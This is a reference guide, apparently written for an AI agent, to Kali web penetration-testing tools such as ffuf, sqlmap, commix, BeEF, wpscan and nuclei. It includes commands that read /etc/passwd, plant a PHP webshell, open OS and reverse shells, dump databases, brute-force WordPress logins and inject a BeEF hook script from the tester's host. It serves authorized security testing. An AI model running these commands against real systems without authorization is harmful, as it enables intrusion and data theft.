# Web Application Testing

**English** · [简体中文](03-web-testing.zh-CN.md)

> **When to read this file**: when the task involves web application penetration testing - directory/parameter/endpoint discovery, SQL injection, OS command injection, XSS, SSTI/CRLF injection, CMS (WordPress/Joomla) fingerprinting and vulnerability scanning, generic web vulnerability scanning, intercepting-proxy auditing, and the like - and you need to provide real, executable Kali tool commands.

## Quick Decision Table

| Scenario (OWASP mapping) | First choice | Alternatives | Key difference |
|---|---|---|---|
| Directory/file brute forcing (information gathering) | ffuf | gobuster / feroxbuster / dirsearch | ffuf's FUZZ keyword can sit anywhere and its filtering is the most flexible; feroxbuster recurses by default; gobuster bundles multiple modes in one tool (dir/dns/vhost/fuzz) |
| Hidden parameter discovery | arjun | ffuf (parameter-position fuzzing) | arjun is purpose-built for parameter discovery and automatically identifies valid GET/POST/JSON parameters |
| SQL injection detection & exploitation (A03) | sqlmap | jsql-injection / sqlsus / sqlninja | sqlmap is all-purpose across every DBMS; sqlninja specializes in MSSQL takeover; sqlsus is a MySQL-focused console-style exploitation tool |
| OS command injection (A03) | commix | manual + Burp/ZAP Repeater | commix automatically tests classic/blind/pseudo-terminal injection and hands you an os_shell |
| Automated XSS detection (A03) | xsser | ffuf + XSS payload wordlist | xsser ships with bypass encodings and multiple injection techniques built in |
| XSS exploitation/browser control (A03) | beef-xss | - | BeEF shows its full power only after hook.js is injected into a real browser |
| Web fingerprinting/tech stack identification | whatweb | wapiti (as a side capability) | whatweb has 900+ plugins and reports the CMS/framework/server/JS library |
| WordPress-specific scanning (A06) | wpscan | nikto | wpscan needs a WPScan API token to match findings against the vulnerability database |
| Joomla-specific scanning (A06) | joomscan | nuclei | joomscan automatically produces HTML/TXT reports |
| Generic known-vulnerability scanning (A06) | nuclei | nikto / wapiti / zaproxy | nuclei is template-driven with few false positives and high speed; nikto leans toward server-configuration issues; wapiti leans toward black-box injection into application logic |
| Intercepting proxy/manual auditing | burpsuite | zaproxy / paros / webscarab / watobo | Burp Community has the best manual-testing experience; ZAP is open source with a built-in active scanner and daemon/CLI support |
| SSTI detection & exploitation (A03) | sstimap | tinja | sstimap can exploit findings and drop into an interactive shell; tinja covers 44 template engines |
| CRLF/response header injection (A03) | crlfuzz | - | Written in Go; supports a single URL and batch files |
| WebDAV upload exploitation (A05) | davtest | - | Automatically tests PUT uploads and script execution |
| Subdomain takeover (A05/A01) | subjack | nuclei (tags takeover) | subjack concurrently scans for CNAMEs pointing at released resources |
| WebDAV/veteran whole-site crawl & scan | - | skipfish / dirb / dirbuster | Backup and supplementary options |

**Typical chain**: `whatweb` fingerprinting → `nuclei`/`nikto` known vulnerabilities → `ffuf`/`gobuster` directories and endpoints → `arjun` hidden parameters → `sqlmap`/`commix` injection exploitation → `burpsuite`/`zaproxy` manual deep dive. On CMS sites, go straight to `wpscan`/`joomscan` first.

## Core Tools in Depth

### ffuf — The most commonly used fast web fuzzer (Go)

**Purpose**: Directory/file discovery, virtual host discovery, GET/POST parameter fuzzing; the FUZZ keyword can be placed anywhere in the URL path, query string, headers, or POST body.
**Installation**: `sudo apt install ffuf` (installed on Kali by default)
**When to use**: Choose it when you need fine-grained filter control (status code/bytes/lines/regex), need to route traffic through a proxy for observation, or are fuzzing parameters/the Host header; for plain recursive directory scanning, feroxbuster saves effort.

```bash
# 基础目录爆破(FUZZ 关键字会被替换为字典词)
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://<target>/FUZZ

# 递归扫描 + 扩展名 + 自动校准(剔除误报)
ffuf -w <wordlist> -u http://<target>/FUZZ -recursion -recursion-depth 2 -e .php,.html,.bak -ac

# 过滤:状态码 / 响应字节数 / 行数 / 词数(先看一次默认响应再填 <size>)
ffuf -w <wordlist> -u http://<target>/FUZZ -mc 200,301,302 -fc 404 -fs <size>
ffuf -w <wordlist> -u http://<target>/FUZZ -fc 404,403 -fl <lines>

# 虚拟主机发现(无 DNS 记录的 vhost,按响应大小差异判断)
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<target> -H "Host: FUZZ.<domain>" -fs <size>

# GET 参数名 fuzz(配合 arjun)
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://<target>/?FUZZ=test" -fs <size>

# POST 参数 fuzz / 结果落盘 / 挂 Burp 代理
ffuf -w <wordlist> -u http://<target>/login -X POST -d "username=FUZZ&password=x" -fc 401
ffuf -w <wordlist> -u http://<target>/FUZZ -o results.json -of json
ffuf -w <wordlist> -u http://<target>/FUZZ -x http://127.0.0.1:8080
```

**Practical tips**:
- `-ac` auto-calibration eliminates many soft-404 false positives; filter custom error pages with `-fs`/`-mr <regex>`.
- Common Kali wordlist: `/usr/share/wordlists/dirb/common.txt`; for a fuller one, install `sudo apt install seclists` (located at `/usr/share/seclists/`).
- Cross-check directory findings with `FUZZ` vs `FUZZ/` (directories) plus `.bak/.old/.zip` backup extensions.

### gobuster — Multi-mode directory/DNS/vHost brute forcer (Go)

**Purpose**: A subcommand-style tool where one binary covers four brute-forcing modes: `dir` (directories), `dns` (subdomains), `vhost` (virtual hosts), and `fuzz` (any position).
**Installation**: `sudo apt install gobuster` (installed on Kali by default)
**When to use**: When you need DNS subdomain enumeration or do not want to memorize several tools; speed is on par with ffuf, but filtering is weaker than ffuf's.

```bash
# 目录爆破 + 扩展名
gobuster dir -u http://<target>/ -w /usr/share/wordlists/dirb/common.txt -x php,html,bak -t 50 -k

# 排除状态码、走代理
gobuster dir -u http://<target>/ -w <wordlist> -b 403,404 --proxy http://127.0.0.1:8080

# DNS 子域枚举(解析 IP 默认显示;-c 顺带检查 CNAME)
gobuster dns -do <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# 虚拟主机发现
gobuster vhost -u http://<target> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain

# 任意位置 fuzz(FUZZ 关键字)
gobuster fuzz -u http://<target>/FUZZ -w <wordlist>
```

**Practical tips**:
- In `dir` mode, 404 is excluded by the default blacklist (status-codes-blacklist defaults to 404) and every other status code is reported; `-s` whitelist / `-b` blacklist are customizable; `-k` skips TLS certificate verification.
- `dns` mode first tests for wildcard DNS (it warns about wildcards automatically); wildcard domains produce across-the-board false positives, so switch wordlists or post-process.
- Division of labor with ffuf: gobuster handles DNS subdomains and quick directory scans, ffuf handles parameters/vhosts/complex filtering.

### arjun — HTTP hidden parameter discovery suite (Python)

**Purpose**: Probes URL endpoints (GET/POST/JSON/XML) for parameters that exist but are not exposed by the front end; hidden parameters are often the entry point for SQL injection/broken access control.
**Installation**: `sudo apt install arjun`
**When to use**: After directory scanning and before moving on to sqlmap/commix, use arjun first to map the full parameter surface; ffuf parameter-name brute forcing only detects "response differences when a parameter name exists", while arjun also confirms with real values over multiple rounds, giving higher accuracy.

```bash
# 探测 GET 参数
arjun -u http://<target>/page.php

# 探测 POST / JSON 参数
arjun -u http://<target>/api -m POST
arjun -u http://<target>/api -m JSON

# 批量 URL、输出参数清单、目标不稳定时降速
arjun -i <file> -oT params.txt
arjun -u <url> --stable -c 5
```

**Practical tips**:
- Feed discovered parameters straight into later exploitation: `sqlmap -u "<url>?<param>=1"`, `commix -u "<url>?<param>=test"`.
- `--stable` uses low concurrency + a single thread, suitable for targets behind a WAF or prone to 502s.
- The output parameters are equally useful for manual testing in Burp Repeater.

### feroxbuster — Recursive content discovery (Rust)

**Purpose**: Forced browsing: recursively brute forces unlinked directories/files and recurses by default; implemented in Rust and extremely fast.
**Installation**: `sudo apt install feroxbuster`
**When to use**: Deep recursive directory discovery where you want to "scan to the bottom in one command"; less configuration than ffuf + `-recursion`, and it can also extract links from pages and then fuzz them.

```bash
# 基础递归扫描
feroxbuster -u http://<target>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -d 2 -t 50

# 扩展名 + 提取页面内链接 + 过滤 404/403
feroxbuster -u http://<target>/ -w <wordlist> --extensions php,bak,zip --extract-links --filter-status 404,403

# 输出结果、忽略 TLS、挂代理
feroxbuster -u http://<target>/ -w <wordlist> -k -o found.txt --proxy http://127.0.0.1:8080
```

**Practical tips**:
- The default depth is 4; on large sites control `-d` and `-t` to avoid knocking the target over or triggering a WAF.
- `--filter-size <bytes>` filters uniform error pages, equivalent to ffuf's `-fs`.
- Works well as the "lazy" alternative to ffuf, especially when many extension combinations are needed.

### dirsearch — Feature-packed web path scanner (Python)

**Purpose**: Command-line directory/file brute forcing with built-in default wordlists and extension logic; supports recursion, multiple protocols, and batch targets.
**Installation**: `sudo apt install dirsearch`
**When to use**: Quick scans grouped by extension, or batch runs from a URL list; slower than ffuf but its defaults are more "out of the box".

```bash
# 基础扫描(指定扩展名)
dirsearch -u http://<target>/ -e php,html,bak

# 递归 + 深度 + 线程 + 自定义字典
dirsearch -u http://<target>/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -r -R 2 -t 30

# 批量目标、排除状态码、随机 UA
dirsearch -l urls.txt -e php -x 403,404 --random-agent
```

**Practical tips**:
- `-r` enables recursion and `-R 2` caps the recursion depth to prevent scan explosions.
- Results are written to the `reports/` directory by default, convenient for record keeping.
- Combine with ffuf: run dirsearch quickly over the defaults first, then fine-grained-fuzz suspicious paths with ffuf.

### wfuzz — Classic web application brute-forcing fuzzer (Python)

**Purpose**: Brute-force enumeration of unlinked resources, GET/POST parameters, and forms; can test SQL/XSS/LDAP and other injection vectors; the veteran ancestor of the FUZZ-keyword mechanism.
**Installation**: `sudo apt install wfuzz` (installed on Kali by default)
**When to use**: When you need the Python ecosystem, multi-payload combinations (`-z` can stack FUZZ and FUZ2Z segments), or multi-dimensional filtering by response lines/words/characters.

```bash
# 目录爆破:彩色输出 + 字典 payload + 隐藏 404(官网示例)
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://<target>/FUZZ

# 过滤维度:--hc/--hl/--hw/--hh(状态码/行数/词数/字符数)
wfuzz -c -z file,<wordlist> --hc 404 --hh <chars> http://<target>/FUZZ

# POST 参数爆破
wfuzz -c -z file,<wordlist> -d "user=FUZZ&pass=test" --hc 401 http://<target>/login

# 请求头 fuzz(如 Host 头注入)
wfuzz -c -z file,<wordlist> -H "X-Forwarded-For: FUZZ" --hc 404 http://<target>/
```

**Practical tips**:
- Official wordlists live at `/usr/share/wfuzz/wordlist/`, split into directories such as general/, tech stacks, and parameter names.
- For dual payloads use the second keyword `FUZ2Z`: `-z file,a.txt -z file,b.txt url/FUZZFUZ2Z`.
- On modern Kali it has been replaced by ffuf for most scenarios, but its multi-dimensional filtering syntax still suits fine-grained tasks.

### sqlmap — Automated SQL injection detection & exploitation (key tool)

**Purpose**: Detects and exploits SQL injection: DBMS fingerprinting, enumerating databases/tables/columns, dumping databases, cracking password hashes, file read/write, OS shell, plus tamper scripts for WAF bypass.
**Installation**: `sudo apt install sqlmap` (installed on Kali by default)
**When to use**: Automated injection verification and data extraction after finding a suspicious parameter (especially together with arjun/Burp); for command injection use commix, not sqlmap.

```bash
# 基础检测 + 枚举数据库(官网示例模式,--batch 自动回答交互)
sqlmap -u "http://<target>/?p=1&forumaction=search" --dbs --batch

# 从 Burp/ZAP 保存的原始请求文件导入(保留 Cookie/头/POST,首选方式)
sqlmap -r request.txt --batch --dbs

# POST 参数 + 指定注入点参数
sqlmap -u "http://<target>/login.php" --data="user=test&pass=test" -p user --dbs

# 自动提取页面表单并测试
sqlmap -u "http://<target>/search.php" --forms --batch --dbs

# 提高检测强度:level 1-5(参数覆盖面), risk 1-3(3 含 OR/时间盲注,危险)
sqlmap -u "<url>" --level=5 --risk=3 --dbs

# 枚举链路:当前用户/库 → 全部用户与口令哈希 → 表 → 列 → 脱库
sqlmap -u "<url>" --current-user --current-db --hostname --batch
sqlmap -u "<url>" --users --passwords --privileges --batch
sqlmap -u "<url>" -D <db> --tables
sqlmap -u "<url>" -D <db> -T <table> --columns
sqlmap -u "<url>" -D <db> -T <table> --dump --start=1 --stop=20
sqlmap -u "<url>" -D <db> --dump-all --exclude-sysdbs

# 全库搜索列名(找密码列)
sqlmap -u "<url>" --search -C username,password

# 文件读取/写入(需高权限或 DBA)
sqlmap -u "<url>" --file-read="/etc/passwd"
sqlmap -u "<url>" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# OS shell / SQL 交互 shell
sqlmap -u "<url>" --os-shell
sqlmap -u "<url>" --sql-shell

# tamper 绕 WAF/过滤(可逗号组合)
sqlmap -u "<url>" --tamper=space2comment,between,randomcase --dbs
ls /usr/share/sqlmap/tamper/   # 查看全部 80+ tamper 脚本

# 批量目标
sqlmap -m urls.txt --batch --dbs        # URL 列表文件
sqlmap -g "inurl:php?id=" --batch       # Google dork 批量(需可访问搜索引擎)
sqlmap -u "http://<target>/" --crawl=3 --batch   # 爬取站点自动测全部带参链接

# 其他高频参数
--dbms=mysql              # 锁定后端 DBMS,加速并减少探测流量
--technique=BEUSTQ        # 指定注入技术 B布尔 E报错 U联合 S堆叠 Q内联查询
--threads=10              # 并发(仅时间盲注等场景勿开高)
--cookie="PHPSESSID=abc"  # 会话保持;认证目标配合 --auth-type/--auth-cred
--csrf-token=<token参数名> # 自动获取并回填 CSRF token
--proxy=http://127.0.0.1:8080  # 经 Burp 观察注入流量(调试 payload 必备)
--delay=1 --timeout=30    # 限速与超时,降低目标压力
--flush-session --fresh-queries  # 重测时清空目标缓存结果
-v 6                      # 最高详细度,可看到完整 payload(调试用)
```

**Common tamper quick reference**: `space2comment` (spaces→`/**/`, bypasses space filtering), `between` (comparison operators→BETWEEN, bypasses `<`/`>` filtering), `randomcase` (random casing), `charencode`/`charunicodeencode` (encoding), `equaltolike` (=→LIKE), `apostrophenullencode`/`unmagicquotes` (bypass quote escaping/magic_quotes), `space2plus` (spaces→`+`), `percentage` (IIS/ASP+WAF), `halfversionedmorekeywords`, `modsecurityversioning` (MySQL ModSecurity bypass).

**Practical tips**:
- Always add `--batch` for automation; re-testing the same URL reads cached results by default, so add `--flush-session` before switching payloads.
- With time-based blind injection (`--technique=T` or auto-detected) high `--threads` is strictly forbidden, otherwise timing jitter causes mass false positives.
- `--os-shell` depends on stacked injection or file-write privileges; on MySQL the common path is `--file-write` a webshell and then reach it over the web.
- Dumped password hashes are automatically handed to john/hashcat for cracking (they must be installed); `--passwords` pulls DBMS account passwords directly.

### commix — Automated OS command injection detection & exploitation

**Purpose**: Automatically detects classic (echo-based), blind (time-based), file-write and other command injection techniques, then drops into a pseudo-terminal (os_shell) on success.
**Installation**: `sudo apt install commix`
**When to use**: When a parameter is concatenated into a system command (ping, filename handling, compression/export and similar scenarios); a sister tool to sqlmap: one handles SQL, the other shell commands.

```bash
# 基础检测 GET 参数
commix -u "http://<target>/ping.php?ip=127.0.0.1" --batch

# 官网示例模式:深入测 HTTP 头注入(Referer 等),level 3 会测 cookie/header
commix --url="http://<target>/<path>.php" --level=3

# POST 参数 / Cookie / 自定义头
commix -u "http://<target>/api" --data="host=127.0.0.1" --batch
commix -u "<url>" --cookie="session=<value>" --headers="X-Forwarded-For: 127.0.0.1"

# 直接要 OS shell / 单命令执行
commix -u "<url>?cmd=inject" --os-shell
commix -u "<url>?cmd=inject" --os-cmd=whoami

# tamper 绕过滤
commix -u "<url>" --tamper=base64encode --batch
```

**Practical tips**:
- os_shell has built-in `reverse_tcp`/`bind_tcp` subcommands and can upgrade directly to a reverse shell (a local listener is required).
- Once the default injection points are tested, just press Enter to accept the defaults; add `--batch` for full automation.
- When detection fails, raise `--level` (it covers more injection spots: cookies, UA, Referer), then verify manually in Burp Repeater.

### beef-xss — Browser exploitation framework (BeEF)

**Purpose**: Controls browsers infected via XSS through hook.js, running social-engineering, information-gathering, intranet-probing and other modules against hooked browsers.
**Installation**: `sudo apt install beef-xss`
**When to use**: After finding stored/reflected XSS and being able to make a real browser load the hook script within the authorized environment, to assess the actual client-side risk; xsser finds the bug, BeEF exploits the bug.

```bash
# 启动 BeEF 服务并打开控制台(Kali 包装脚本)
sudo beef-xss
# 输出: Web UI: http://127.0.0.1:3000/ui/panel
#       Hook: <script src="http://<ip>:3000/hook.js"></script>

# 停止服务
sudo beef-xss-stop
```

**Practical tips**:
- Console credentials are set at install time; the config file is `/etc/beef-xss/config.yaml` (listening IP/port and extension modules can be changed there).
- Inject the Hook URL into the target page as the XSS payload; as soon as a browser loads hook.js, it shows up in the Online Browsers list.
- When the target and BeEF are on different origins the same-origin policy restricts you, so prefer stored injection points; for intranet testing BeEF can listen on 0.0.0.0.

### xsser — Automated XSS detection framework

**Purpose**: An XSS framework for automated detection, exploitation, and filter bypass; ships multiple payload sets plus encoding/obfuscation tricks, and supports report output and a GUI wizard.
**Installation**: `sudo apt install xsser`
**When to use**: Spraying XSS payloads across many URLs/parameters in bulk, or auto-trying filter bypasses; it "understands XSS" better than ffuf + a wordlist.

```bash
# 对目标 URL 自动检测
xsser -u "http://<target>/search.php?q=XSS" --auto

# 注入自定义 payload(--Fp 最终 payload)
xsser -u "http://<target>/search.php?q=XSS" --Fp "<script>alert(1)</script>"

# 启动 GTK 图形界面(向导式配置)
xsser --gtk
```

**Practical tips**:
- Once injection is confirmed, swap the payload for the BeEF hook URL to complete the exploitation chain.
- `--auto` only detects, it does not "attack" the browser; consider manual payloads when writing reports/collecting evidence.
- On modern complex front ends (SPA, CSP) automated hit rates are limited; the fallback remains manual injection with Burp.

### whatweb — Web tech stack fingerprinting (Ruby)

**Purpose**: 900+ plugins identifying CMSes, blog platforms, analytics packages, JS libraries, web servers, embedded devices and more; also extracts version numbers, email addresses, SQL errors and the like.
**Installation**: `sudo apt install whatweb` (installed on Kali by default)
**When to use**: The first step of any web test; once the CMS/framework is known, decide between wpscan/joomscan, nuclei with specific tags, or a generic vulnerability scan.

```bash
# 激进模式详细报告(官网示例)
whatweb -v -a 3 <target>

# 快速批量(IP 段/列表文件),不报错误
whatweb --no-errors -a 3 192.168.1.0/24
whatweb --no-errors -i hosts.txt

# 指定 UA / 代理;JSON 日志留档
whatweb -a 3 -U "Mozilla/5.0" <target>
whatweb -a 3 --log-json=whatweb.json <target>
```

**Practical tips**:
- `-a` aggression runs from 1 (default, one request) to 3+ (actively probes directories such as /admin and README); keep it at 1 for stealthy assessments.
- Feed the reported version numbers straight into `searchsploit <product> <version>` to look up public vulnerabilities.
- For sites behind a WAF/CDN, remember to fingerprint with a real business path included (e.g. `/wordpress/`).

### wpscan — WordPress black-box vulnerability scanner

**Purpose**: Scans remote WordPress installations: theme/plugin enumeration, version comparison, user enumeration, config backup leaks, weak-password brute forcing; plugs into the WPVulnDB API for vulnerability intelligence.
**Installation**: `sudo apt install wpscan`
**When to use**: A mandatory step after whatweb confirms WordPress; user enumeration + `wp-login.php` brute forcing is the most common entry point.

```bash
# 枚举热门插件/主题/用户(基础)
wpscan --url http://<target>/ --enumerate u,t,p

# 全量枚举(慢)+ 配置备份 + 数据库导出泄露
wpscan --url http://<target>/ --enumerate ap,at,u,cb,dbe --plugins-detection aggressive

# 接入 WPScan 漏洞库(免费注册获取 API token)
wpscan --url http://<target>/ --enumerate vp,vt --api-token <token>

# 用户口令爆破(字典需先解压: gzip -d /usr/share/wordlists/rockyou.txt.gz)
wpscan --url http://<target>/ --usernames admin --passwords /usr/share/wordlists/rockyou.txt
```

**Practical tips**:
- Without an API token it only lists versions/components without CVE matching, so be sure to register the free token.
- `--enumerate u` enumerates via `?author=1`; if that is blocked, switch to XML-RPC (`system.multicall`) or wpscan's username wordlist.
- An open `xmlrpc.php` can assist brute forcing; for outdated plugins, first verify known vulnerabilities with nuclei (`-tags wordpress`).

### joomscan — OWASP Joomla vulnerability scanner

**Purpose**: Detects the Joomla CMS version, core vulnerabilities, directory listing, sensitive files, admin panel location, backup/log files and more, and generates a report automatically.
**Installation**: `sudo apt install joomscan`
**When to use**: A one-shot health check after whatweb confirms Joomla; the output is the report, well suited for delivery.

```bash
# 扫描 Joomla 站点(官网示例)
joomscan -u http://<target>/

# Joomla 位于子目录时
joomscan -u http://<target>/joomla/

# 枚举已安装组件(漏洞高发区)
joomscan -u http://<target>/ -ec
```

**Practical tips**:
- Reports land in `/usr/share/joomscan/report/<host>/` (HTML+TXT dual formats; note the directory name is the singular "report").
- A "core not vulnerable" finding only covers the core version; third-party components are the main way Joomla gets breached - after `-ec` enumeration, check each one for CVEs.
- Directory listing results (e.g. `/images/banners`) often leak sensitive files directly; browse them manually first.

### nikto — Classic web server security scanner (Perl)

**Purpose**: Runs 6700+ checks against a web server: dangerous files/CGI, outdated versions, configuration issues, missing HTTP security headers and more.
**Installation**: `sudo apt install nikto` (installed on Kali by default)
**When to use**: A quick health check for server-level configuration issues (complementary to nuclei's known-CVE scanning); no JS rendering support, so it performs poorly on SPA sites.

```bash
# 官网示例:HTML 报告 + 指定 Tuning 类别 + 过滤输出
nikto -Display 1234EP -o report.html -Format htm -Tuning 123bde -host <target>

# 简单扫描
nikto -h http://<target>/

# 多端口 + SSL
nikto -h <target> -p 80,443 -ssl

# 排除 DoS 类测试、走 Burp 代理、HTTP 认证、限时
nikto -h <target> -Tuning x 6 -useproxy http://127.0.0.1:8080
nikto -h <target> -id <user>:<pass> -maxtime 30m
```

**Practical tips**:
- Tuning numeric categories: 1 interesting files, 2 misconfiguration, 3 information disclosure, 4 injection, 6 DoS (recommended to exclude), b software identification, d WebService, e Administrative Console, 0 File Upload; `x` means negated exclusion.
- Output is noisy; focus on outdated component versions, backup files, information leaks such as `/server-status`, and HTTP methods.
- Run it alongside nuclei: nikto covers server configuration, nuclei (`-tags cve,misconfig`) covers precise vulnerabilities.

### nuclei — Template-driven vulnerability scanner (Go)

**Purpose**: Precisely matches and verifies known CVEs, misconfigurations, information disclosure, default credentials and more using YAML templates; supports HTTP/DNS/TCP/file protocols with extremely low false positives.
**Installation**: `sudo apt install nuclei` (installed on Kali by default)
**When to use**: The first round of known-vulnerability scanning for any target; batch large-scale assets from a URL list; custom templates enable tailored detection.

```bash
# 单目标全模板扫描(默认已含 cve/misconfig/exposure 等)
nuclei -u http://<target> -o nuclei-results.txt

# 批量目标 + 限速(大规模资产必限速)
nuclei -l urls.txt -rl 100 -c 25 -o nuclei-results.txt

# 按严重级/标签过滤
nuclei -u http://<target> -severity critical,high
nuclei -u http://<target> -tags cve,exposure,misconfig
nuclei -l urls.txt -tags takeover -severity high

# 更新模板库(社区模板每日更新)
nuclei -update-templates

# 静默模式只输出命中行
nuclei -u http://<target> -silent -severity critical,high
```

**Practical tips**:
- Kali templates live at `/usr/share/nuclei-templates/` (or `~/nuclei-templates`); use `-t <dir>` to run only a subset.
- Combining `-severity` with `-tags` is the main noise-control lever; against intranet assets `-tags exposure,token` often turns up leaked keys directly.
- Verify `[critical]`/`[high]` findings first before writing the report; nuclei hits are highly credible but still need manual review of whether the payload actually works.

### wapiti — Black-box web application vulnerability scanner (Python)

**Purpose**: Crawls a site and then injects payloads like a fuzzer, detecting XSS, SQL/blind injection, command execution, SSRF, XXE, CSRF, redirects, file disclosure and more.
**Installation**: `sudo apt install wapiti`
**When to use**: When you need an all-in-one "crawl + inject" black-box scan with a report; runs with zero configuration on apps that require no login, but its SPA support is weaker than ZAP's.

```bash
# 基础扫描
wapiti -u http://<target>/

# 指定爬取范围 + 输出目录与格式
wapiti -u http://<target>/ --scope folder -o wapiti-report -f html

# 只跑/禁用指定模块、查看模块列表
wapiti -u http://<target>/ -m xss,sql,ssrf
wapiti --list-modules
wapiti -u http://<target>/ -m "-exec"   # 禁用命令执行模块(防止危害生产)

# 带 Cookie 扫描登录后区域
wapiti -u http://<target>/ -c "<cookie-string>"
```

**Practical tips**:
- `--scope url|page|folder|domain` controls the crawl boundary; always restrict subdomains that fall outside the authorized scope.
- Results are in `index.html` under the output directory, paginated by vulnerability class, with request/response evidence.
- Division of labor with nuclei: nuclei does signature-level known vulnerabilities, wapiti does injection-level black-box testing; the two complement each other.

### zaproxy — OWASP ZAP all-round web pentest proxy

**Purpose**: An intercepting proxy + spider + active/passive scanner + fuzzer in one; free and open source, supporting GUI, headless daemon mode, and command-line quick scans.
**Installation**: `sudo apt install zaproxy` (installed on Kali by default)
**When to use**: Burp Community has no active scanner while ZAP ships one for free; choose ZAP when you need CI/CD integration or headless scanning.

```bash
# GUI 启动(默认代理 127.0.0.1:8080)
zaproxy

# 无头 daemon 模式(供其他工具挂代理)
zaproxy -daemon -port 8081 -host 127.0.0.1

# 命令行快速扫描并出报告(spider+scan 一条龙)
zaproxy -cmd -quickurl http://<target>/ -quickout zap-report.html
```

**Practical tips**:
- After pointing the browser proxy at ZAP, browse manually first - spider + Active Scan coverage depends on the quality of the URLs crawled beforehand.
- `-daemon` mode combined with the REST API (`/JSON`) enables automation integration; `-cmd -quickurl` suits bulk rough scans.
- Choosing between Burp and ZAP: ZAP scans harder and is free, Burp has the stronger plugin ecosystem and manual experience; you can also run both chained (cascading proxies).

### burpsuite — Web security testing integrated platform (Community Edition)

**Purpose**: Intercepts/modifies requests, plus a spider and the Repeater/Decoder/Comparer manual toolset; the Kali repository edition is the free Community edition (no active scanner, restricted Intruder).
**Installation**: `sudo apt install burpsuite` (installed on Kali by default, Community edition)
**When to use**: Every step that needs manual verification: analyzing parameters, replaying modified requests, verifying injection payloads, testing broken access control; the command center for the semi-automated tools (sqlmap/commix/ffuf).

```bash
# 启动 GUI(内置监听 127.0.0.1:8080)
burpsuite

# 其他工具挂 Burp 代理观察/记录流量
sqlmap -r request.txt --proxy=http://127.0.0.1:8080 --batch
ffuf -w <wordlist> -u http://<target>/FUZZ -x http://127.0.0.1:8080
```

**Practical tips**:
- Request files obtained via right-click "Save items" in Proxy→HTTP history can be used directly with `sqlmap -r`, sparing you manual parameter assembly.
- Certificate: visit `http://burpsuite` in the browser and download the CA certificate before HTTPS can be intercepted.
- The Community edition cannot do active scanning - leave bulk scanning to nuclei/wapiti/zaproxy and keep Burp focused on manual verification and exploitation.

### davtest — WebDAV server exploitation testing

**Purpose**: Tests WebDAV services: whether MKCOL can create directories, whether PUT can upload files of various extensions, and whether uploaded scripts execute; quickly judges whether the DAV service is exploitable.
**Installation**: `sudo apt install davtest`
**When to use**: When nuclei/nikto report `PUT`/WebDAV methods enabled, or directory brute forcing uncovers a WebDAV directory.

```bash
# 官网示例:扫描 WebDAV 服务器
davtest -url http://<target>/

# 指定子目录 + 认证 + 结束后清理上传物
davtest -url http://<target>/webdav/ -auth <user>:<pass> -cleanup

# 在指定后缀目录下创建测试目录
davtest -url http://<target>/ -directory <dir>
```

**Practical tips**:
- Only extensions showing both `PUT SUCCEED` and `EXEC SUCCEED` in the output are exploitable (commonly txt/html upload fine while php/asp are blocked).
- When upload succeeds but execution fails, try changing the extension case, double extensions (`shell.php.txt`), or MOVE into an executable directory.
- Always run `-cleanup` afterward or manually delete the DavTestDir directory to avoid leaving traces.

### sstimap — Automated SSTI/code injection detection & exploitation

**Purpose**: Detects and exploits server-side template injection (SSTI) and code injection, and can execute system commands interactively; supports multiple injection points across URLs/forms/headers.
**Installation**: `sudo apt install sstimap`
**When to use**: When the target uses a template engine such as Jinja2/Twig/Freemarker/Velocity and a parameter echoes template syntax back; if `${7*7}` echoes 49, it is a hit.

```bash
# 基础检测
sstimap -u http://<target>/page?name=test

# POST 数据 + Cookie + 自定义头注入点
sstimap -u http://<target>/api -d "name=test" -C "session=<value>"
sstimap -u http://<target>/ -H "X-Forwarded-For: 127.0.0.1"

# 批量 URL / 交互模式
sstimap --load-urls urls.txt
sstimap -i
```

**Practical tips**:
- After detection succeeds, the interactive shell can execute system commands directly (similar to `--os-cmd`); once confirmed, build a stable payload by hand.
- Division of labor with tinja: sstimap combines detection + exploitation, while tinja's wider engine coverage suits confirming "which template engine it is".
- SSTI is high-risk (Jinja2/Twig often mean direct RCE); on a hit, assess the impact immediately and take screenshots for evidence.

### tinja — Template injection testing CLI (Go)

**Purpose**: Performs template injection detection against web pages, covering 44 mainstream template engines across 8 languages, and automatically identifies the engine type.
**Installation**: `sudo apt install tinja`
**When to use**: When you need to quickly tell whether an injection point is SSTI and which template engine it is; cross-validate with sstimap.

```bash
# 检测 URL(自动遍历 payload 与引擎)
tinja url -u "http://<target>/page?name=test"

# POST 数据检测
tinja url -u "http://<target>/api" -X POST -d "name=test"

# 从文件批量检测
tinja file -f urls.txt
```

**Practical tips**:
- After a hit, look up the matching RCE payload for the reported engine type (syntax differs greatly between engines).
- If engine identification fails but SSTI is suspected, manually run the triple probe `${7*7}`, `{{7*7}}`, `#set($x=7*7)${x}`.
- Implemented in Go and fast; good for first-pass screening of large lists before fine-grained exploitation with sstimap.

### crlfuzz — Fast CRLF injection scanning (Go)

**Purpose**: Detects CRLF (`%0d%0a`) injection in URLs, which can lead to response header injection (Set-Cookie/XSS), cache poisoning, and request smuggling.
**Installation**: `sudo apt install crlfuzz`
**When to use**: When URL parameters are concatenated into response headers such as Location/Set-Cookie, or when a redirect parameter is controllable.

```bash
# 单 URL 检测
crlfuzz -u "http://<target>/redirect?url=https://<domain>/"

# 从文件批量检测
crlfuzz -l urls.txt

# 指定 HTTP 方法
crlfuzz -u "<url>" -X POST
```

**Practical tips**:
- Pipe style: `cat urls.txt | crlfuzz` also works (stdin input).
- Verify manually after a hit: inject `%0d%0aSet-Cookie:xsstrue=1` and watch whether the response header splits.
- CRLF often co-occurs with open redirects; combined with a caching layer it can escalate into cache poisoning, so spell out the impact chain in the report.

### subjack — Subdomain takeover detection (Go)

**Purpose**: Scans subdomain lists concurrently, flagging takeover risk where CNAMEs point at released/registrable resources (Heroku, GitHub Pages, AWS S3, etc.).
**Installation**: `sudo apt install subjack`
**When to use**: Takeover screening after asset collection (gobuster dns/subfinder) produces a subdomain list.

```bash
# 基础扫描(线程 100 + HTTPS + 详细输出)
subjack -w subdomains.txt -t 100 -ssl -v

